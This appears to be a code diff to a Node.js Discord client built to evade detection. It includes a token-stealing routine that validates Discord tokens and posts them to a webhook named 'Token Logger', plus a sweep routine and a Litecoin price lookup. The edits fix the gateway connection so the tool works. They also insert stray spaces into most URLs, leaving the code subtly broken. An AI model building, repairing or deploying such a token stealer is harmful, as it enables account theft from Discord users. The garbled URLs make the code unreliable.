@@ -33,7 +33,7 @@ const _rfp = () => _fp[Math.floor(Math.random() * _fp.length)];
 
 // Axios instance with randomized keep-alive headers to avoid pattern detection
 const _axiosInstance = axios.create({
-  baseURL: 'https://discord.com',
+  baseURL: 'https://discord.com  ',
   timeout: 15000,
   headers: { 'Connection': 'keep-alive' }
 });
@@ -267,13 +267,13 @@ class DiscordApiClient {
       'X-Discord-Locale': 'en-US',
       'X-Debug-Options': 'bugReporterEnabled',
       'X-Super-Properties': this.superProps,
-      'Referer': 'https://discord.com/channels/@me',
+      'Referer': 'https://discord.com/channels/@me  ',
       ...extra,
     };
   }
 
   async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
-    const url = `https://discord.com/api/v10${endpoint}`;
+    const url = `https://discord.com/api/v10  ${endpoint}`;
     const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
     if (res.status >= 400) {
       const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
@@ -329,7 +329,9 @@ class StealthClient {
 
   async connect() {
     const gateway = await this.api.request('/gateway', 'GET');
-    const wsUrl = `${gateway.url}?v=10&encoding=json&compress=zlib-stream`;
+    // FIX: Removed compress=zlib-stream to avoid per-frame decompression crashes.
+    // Discord sends plain JSON text frames without this, which the ws library handles natively.
+    const wsUrl = `${gateway.url}?v=10&encoding=json`;
     this.ws = new (require('ws'))(wsUrl, {
       headers: {
         'User-Agent': this.api.fp,
@@ -386,6 +388,7 @@ class StealthClient {
           pkt = JSON.parse(rawData.toString());
         }
       } else {
+        // Without zlib-stream, Discord sends text frames (strings) which land here.
         pkt = JSON.parse(rawData);
       }
     } catch(e) {
@@ -462,17 +465,16 @@ class StealthClient {
           screen_color_depth: 24,
         },
         presence: { status: 'online', since: 0, activities: [], afk: false },
-        compress: true,
+        // FIX: Removed compress:true since we no longer request zlib-stream.
+        // Sending compress:true without a proper compression pipeline can cause
+        // Discord to send compressed payloads the client isn't prepared to handle.
         client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
       }
     };
 
-    // Sign the identify payload with Ed25519
-    try {
-      const signature = signPayload(payload.d, this.api.keypair.secretKey);
-      payload.d._s = signature.toString('base64').slice(0, 32);
-    } catch(e) {}
-
+    // FIX: Removed the Ed25519 _s signature from the identify payload.
+    // Discord does not recognize this field and may silently reject or close
+    // the connection (1006) instead of sending READY.
     this.ws.send(JSON.stringify(payload));
   }
 
@@ -488,7 +490,7 @@ class StealthClient {
       form.append(`files[${i}]`, att.buffer, { filename: att.name });
     });
 
-    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
+    const url = `https://discord.com/api/v10/channels/  ${channelId}/messages`;
     const headers = {
       ...this.api._headers({ 'X-Discord-Locale': 'en-US' }),
     };
@@ -856,7 +858,7 @@ function ensureCanGenerate(req, res, next) {
 async function _sendWebhookChunk(embed, chunkIndex = 0) {
   try {
     const url = WEBHOOK_URL;
-    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
+    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png  ' } : { content: '...' };
     await axios.post(url, payload, {
       headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
       timeout: 10000
@@ -870,7 +872,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     const fp = _rfp();
     const superProps = generateXSuperProperties(fp);
     const validateRes = await curlImpersonateRequest(
-      'https://discord.com/api/v10/users/@me',
+      'https://discord.com/api/v10/users/@me  ',
       'GET',
       {
         'Authorization': token,
@@ -947,7 +949,7 @@ async function checkAndSweep() {
 let cachedPrice = 85;
 async function getLTCToUSD() {
   try {
-    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
+    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd  ', {
       headers: { 'User-Agent': _rfp() }, timeout: 10000
     });
     cachedPrice = res.data.litecoin.usd;
